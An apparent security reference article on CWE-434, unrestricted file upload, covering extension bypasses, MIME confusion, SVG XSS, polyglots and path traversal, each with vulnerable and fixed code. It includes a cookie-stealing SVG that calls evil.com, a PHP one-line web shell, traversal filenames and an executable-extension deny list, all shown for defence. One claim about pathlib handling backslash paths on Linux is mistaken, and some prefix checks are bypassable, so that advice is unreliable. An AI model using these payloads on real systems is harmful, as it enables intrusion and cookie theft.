---
description: "CWE-434: Unrestricted Upload of Dangerous File Type - uploaded files execute on server. Extension bypass, MIME confusion, SVG XSS, polyglots, path traversal in filename."
date: 2026-04-16
tags: [security, cwe, file-upload, rce, web, xss, path-traversal]
level: Advanced
---

# CWE-434: Unrestricted Upload of Dangerous File Type

**CWE Top 25 Rank:** 10 (2024).
**Impact range:** RCE (upload PHP/JSP shell), Stored XSS (upload SVG/HTML), Path traversal (overwrite config files), DoS (upload ZIP bomb, infinite loop scripts).
**Core issue:** The server accepts and stores files that the server or clients will subsequently execute or render in a privileged context.

---

## Functional Semantics

The vulnerability manifests in two distinct execution contexts:

1. **Server-side execution:** uploaded file is placed in a directory served by an application runtime (PHP, Python, Node.js, JSP/Servlet), allowing the attacker to request the file and have the server execute it.
2. **Client-side execution:** uploaded file is served to other users with a MIME type that causes the browser to execute it (SVG with embedded JS, HTML files, XML with XSLT).

Secondary impact without execution: **path traversal in filename** allows overwriting arbitrary files on the server; **ZIP/archive bombs** cause resource exhaustion.

---

## Extension Bypass Techniques

### Double extension

```
shell.php.jpg    # Apache with misconfigured AddHandler will execute as PHP
shell.php%00.jpg # Null byte truncation in older PHP: stored as shell.php
shell.pHp        # Case-insensitive file system + case-insensitive extension check
shell.php5       # Alternative PHP extension not in blocklist
shell.phtml      # Another PHP alternative extension
shell.shtml      # Apache SSI - Server Side Includes execution
```

**Incomplete blocklists (common mistakes):**

```python
# VULNERABLE: blocklist approach, incomplete
BLOCKED_EXTENSIONS = {'.php', '.asp', '.aspx', '.py', '.rb'}

def validate_upload(filename):
    ext = os.path.splitext(filename)[1].lower()
    if ext in BLOCKED_EXTENSIONS:
        raise ValueError("Dangerous file type")
    # Misses: .php5, .phtml, .shtml, .cgi, .pl, .jsp, .jspx, .cfm, etc.
```

```python
# FIXED: allowlist approach - only permit explicitly safe types
ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.webp', '.pdf', '.mp4'}

def validate_upload(filename):
    # Use pathlib to handle complex extension cases
    ext = pathlib.Path(filename).suffix.lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError(f"File type not permitted: {ext}")
```

### Null byte injection (legacy PHP/older systems)

```
# HTTP multipart body:
Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"

# PHP < 5.3.4: null byte truncates the string → stored as shell.php
# Modern PHP: fixed, but may exist in custom C extensions
```

### Archive extraction path traversal (Zip Slip)

```python
# VULNERABLE: extracting ZIP without path validation
import zipfile

def extract_upload(zip_path, dest_dir):
    with zipfile.ZipFile(zip_path) as zf:
        zf.extractall(dest_dir)   # archive may contain ../../etc/cron.d/evil
```

```python
# FIXED: validate each member path stays within dest_dir
import zipfile, pathlib

def safe_extract(zip_path, dest_dir):
    dest = pathlib.Path(dest_dir).resolve()
    with zipfile.ZipFile(zip_path) as zf:
        for member in zf.namelist():
            member_path = (dest / member).resolve()
            if not str(member_path).startswith(str(dest)):
                raise ValueError(f"Path traversal attempt: {member}")
            zf.extract(member, dest_dir)
```

---

## MIME Type Confusion

### Client-supplied Content-Type (never trust)

```python
# VULNERABLE: trusting browser-provided Content-Type
def handle_upload(request):
    content_type = request.FILES['file'].content_type   # from HTTP header, attacker-controlled
    if content_type.startswith('image/'):
        save_file(request.FILES['file'])   # attacker sends PHP shell with Content-Type: image/jpeg
```

```python
# FIXED: detect MIME from file content (magic bytes), not headers
import magic   # python-magic library

def handle_upload(request):
    uploaded = request.FILES['file']
    file_bytes = uploaded.read(2048)
    uploaded.seek(0)

    detected_mime = magic.from_buffer(file_bytes, mime=True)
    if detected_mime not in ALLOWED_MIME_TYPES:
        raise ValueError(f"Detected type {detected_mime} not allowed")
    save_file(uploaded)
```

**Magic bytes for common types:**

| Type | First bytes |
|------|-------------|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` (`GIF8`) |
| PDF | `25 50 44 46` (`%PDF`) |
| ZIP | `50 4B 03 04` |
| PHP | `3C 3F 70 68` (`<?ph`) - always reject this magic in image uploads |

---

## SVG with Embedded JavaScript (Stored XSS)

SVG is XML and can contain `<script>` tags. When served as `image/svg+xml`, browsers execute the JavaScript in the page's origin context.

```svg
<!-- ATTACK: uploaded as avatar.svg -->
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    // Executes in the origin of the site serving this SVG
    document.cookie  // accessible
    fetch('https://evil.com/steal?c=' + document.cookie)
  </script>
  <rect width="100" height="100"/>
</svg>
```

**Fix options:**

```python
# Option 1: reject SVG entirely if user-generated content
ALLOWED_IMAGE_TYPES = {'image/jpeg', 'image/png', 'image/gif', 'image/webp'}
# image/svg+xml NOT in this set

# Option 2: if SVG needed, sanitize with bleach/DOMPurify on the server
import bleach

def sanitize_svg(svg_content: str) -> str:
    # Allow structural SVG tags, disallow script/foreignObject/use href tricks
    allowed_tags = {'svg', 'path', 'circle', 'rect', 'line', 'g', 'text', 'defs'}
    allowed_attrs = {'viewBox', 'width', 'height', 'd', 'fill', 'stroke', 'cx', 'cy', 'r'}
    return bleach.clean(svg_content, tags=allowed_tags, attributes=allowed_attrs, strip=True)

# Option 3: serve SVG with Content-Disposition: attachment (no execution in browser)
# and Content-Type: application/octet-stream
```

---

## Polyglot Files

A file that is simultaneously valid in two formats. Example: a valid JPEG that is also a valid PHP script.

```
# JPEG header
FF D8 FF E0  ...  [valid JPEG data]

# After JPEG data, PHP code appended (JPEG parser ignores trailing data)
<?php system($_GET['cmd']); ?>
```

The JPEG renders correctly in an image viewer. If served via PHP with certain `eval` patterns or included via `include`, the PHP interpreter executes it.

**Defense:** Image reprocessing (re-encode all uploaded images):

```python
from PIL import Image
import io

def sanitize_image_upload(file_bytes: bytes) -> bytes:
    """Re-encode image to strip appended code and EXIF payloads."""
    img = Image.open(io.BytesIO(file_bytes))
    img.verify()  # raises if not valid image

    # Re-open (verify() leaves the file at end of stream)
    img = Image.open(io.BytesIO(file_bytes))
    output = io.BytesIO()
    # Re-encode: strips EXIF, appended PHP, embedded JS in metadata
    img.save(output, format=img.format or 'JPEG', exif=b'')
    return output.getvalue()
```

---

## Path Traversal in Filename

```python
# VULNERABLE: using user-supplied filename directly
def save_upload(filename, data):
    path = os.path.join('/var/uploads', filename)
    # filename = '../../etc/cron.d/evil' → writes to /etc/cron.d/evil
    with open(path, 'wb') as f:
        f.write(data)
```

```python
# FIXED: use only the basename, generate server-side name
import uuid, pathlib

def save_upload(filename: str, data: bytes) -> str:
    # Extract only the base filename, discard any directory components
    safe_name = pathlib.Path(filename).name   # strips ../../ prefixes
    ext = pathlib.Path(safe_name).suffix.lower()

    # Better: generate a new UUID-based name entirely (avoids name conflicts + traversal)
    stored_name = f"{uuid.uuid4()}{ext}"
    dest = pathlib.Path('/var/uploads') / stored_name

    # Paranoid check: verify final path is within uploads dir
    if not str(dest.resolve()).startswith('/var/uploads'):
        raise ValueError("Path traversal detected")

    dest.write_bytes(data)
    return stored_name
```

---

## Upload to Webroot / Execution Context

A file that would be safe as a download becomes dangerous when placed in a directory served by the application runtime.

```nginx
# VULNERABLE nginx + php-fpm config
location /uploads/ {
    # Files served from here
}
location ~ \.php$ {
    fastcgi_pass php-fpm;
    # If upload dir overlaps with PHP-served dir, uploaded .php files execute
}
```

```nginx
# FIXED: explicitly disable execution in uploads directory
location /uploads/ {
    add_header Content-Disposition "attachment";
    location ~ \.(php|phtml|php5|shtml|cgi|pl|jsp)$ {
        deny all;   # block execution even if misconfigured
    }
}
```

**Principle:** uploaded files must never be stored inside or below the application's code/template root. Serve from a separate origin (`static.example.com`) or object storage (S3, GCS) with no execution capability.

---

## Affected Ecosystems

| Ecosystem | Specific risks | Notes |
|-----------|---------------|-------|
| PHP | `.php`, `.phtml`, `.php5` execution | Most critical; PHP includes from file path are RCE |
| Python/Django | Indirect (no direct file execution); SVG XSS | Static files served differently; Django doesn't exec uploads |
| Java/JSP | `.jsp`, `.jspx` execution if in webapp root | Upload to `WEB-INF/` can bypass; upload outside webroot is safe |
| Node.js | No file execution from disk by default; `require()` injection possible | SVG XSS via `res.sendFile` with wrong Content-Type |
| Ruby on Rails | CarrierWave/Paperclip misconfigs; SVG XSS | Content-Type from filename extension: check for `.svg` |
| ASP.NET | `.aspx`, `.ashx` execution if in IIS-served dir | IIS serves `.aspx` from anywhere in webroot |
| Go | No built-in file execution; SVG XSS via `http.ServeFile` | Custom exec via `os/exec` with uploaded filename possible |

---

## Detection Heuristics

1. Find file upload handlers: search for `multipart/form-data`, `request.FILES`, `UploadedFile`, `MultipartFile`, `IFormFile`, `upload.single()`.
2. For each handler, check: is there an extension allowlist (not blocklist)? Is there MIME validation using magic bytes (not `Content-Type` header)?
3. Check where uploaded files are stored: is the path inside the webroot? Is the directory served with execute permissions?
4. Check if the stored filename derives from user input: `filename` field in `Content-Disposition`. Any path component from user input without `basename()` is path traversal.
5. For image uploads: is there image reprocessing (Pillow, ImageMagick `convert`)? No reprocessing = polyglot / metadata payload risk.
6. Check served `Content-Type`: are uploaded files served with the correct type, or does the server guess from extension?

```bash
# Grep patterns
grep -rn "request.FILES\|multipart\|upload" --include="*.py" -l
grep -rn "\.filename\|getOriginalFilename\|getClientFilename" --include="*.java" -l
grep -rn "req\.file\|multer\|busboy" --include="*.js" -l
grep -rn "IFormFile\|HttpPostedFileBase" --include="*.cs" -l
```

---

## Fixing Patterns

| Control | Implementation |
|---------|---------------|
| Extension allowlist | `ALLOWED_EXT = {'.jpg', '.png', '.pdf'}; if ext not in ALLOWED_EXT: reject` |
| MIME from magic bytes | `python-magic`, `file-type` (npm), `net/http.DetectContentType` (Go) |
| Store outside webroot | Upload to `/var/uploads/` (not in `/var/www/`) or object storage |
| Separate static origin | Serve user uploads from `uploads.example.com` - different origin prevents cookie theft |
| UUID filenames | `stored_as = str(uuid4()) + ext` - prevents path traversal and name guessing |
| Image reprocessing | `PIL.Image.open() → img.save()` strips appended code and EXIF |
| Content-Disposition header | `Content-Disposition: attachment` forces download instead of render |
| Antivirus scanning | ClamAV on uploaded files - catches known malware, not custom shells |
| File size limit | Prevent ZIP bombs; `MAX_UPLOAD_SIZE = 10 * 1024 * 1024` |

---

## Gotchas - False Positive Indicators

- **Admin-only upload endpoints with no external user access:** lower risk profile, but admin account compromise still exploitable; not a zero-risk finding.
- **Upload to object storage (S3/GCS) with `NoExecute` policy:** files stored in S3 cannot be executed server-side; SVG XSS remains possible if served directly from S3 without `Content-Disposition: attachment`.
- **`Content-Type: image/jpeg` validation via header** from browser: not a fix, it's client-supplied. It matters only if validation uses `magic.from_buffer()`.
- **`os.path.basename()` on Windows paths on Linux:** `os.path.basename('C:\\..\\evil.php')` on Linux returns `C:\\..\\evil.php` (not just the filename). Use `pathlib.Path(filename).name` which handles both separators.
- **Image libraries that tolerate corrupted headers:** PIL `Image.open()` raises on truly invalid files but accepts many polyglots. `img.verify()` + re-open + re-save is the reliable pattern.

---

## See Also

- [[cwe-22-path-traversal]] - path traversal in filename component
- [[cwe-79-xss]] - consequence via SVG/HTML upload
- [[cwe-352-csrf]] - often combined with file upload to force victim's upload
- [[cwe-732-insecure-permissions]] - upload dir permissions enabling execution
- [[web-application-security-fundamentals]] - broader web security context
